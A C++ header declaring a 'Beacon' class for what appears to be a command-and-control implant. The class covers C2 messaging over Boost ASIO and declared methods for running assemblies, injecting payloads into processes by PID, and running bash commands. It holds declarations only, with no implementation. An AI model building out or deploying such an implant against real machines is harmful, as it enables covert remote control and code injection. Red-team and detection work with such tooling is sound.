#pragma once

#include <iostream>
#include <fstream>
#include <memory>
#include <chrono>
#include <random>
#include <vector>
#include <thread>

#include <boost/asio.hpp>
#include <boost/bind.hpp>
#include <boost/shared_ptr.hpp>

#include <SocketHandler.hpp>

#include "C2Message.pb.h"


class Beacon
{

public:
	Beacon(std::string& ip, int port);
	~Beacon();

protected:
	bool execInstruction(C2Message& c2Message, C2Message& c2RetMessage);

	std::string m_ip;
	int m_port;

private:
	std::string execAsembly(const std::string& payload);
	std::string inject(int pid, const std::string& payload);
	std::string execBash(const std::string& cmd);

	std::vector<std::unique_ptr<std::thread>> m_threadsExec;
};
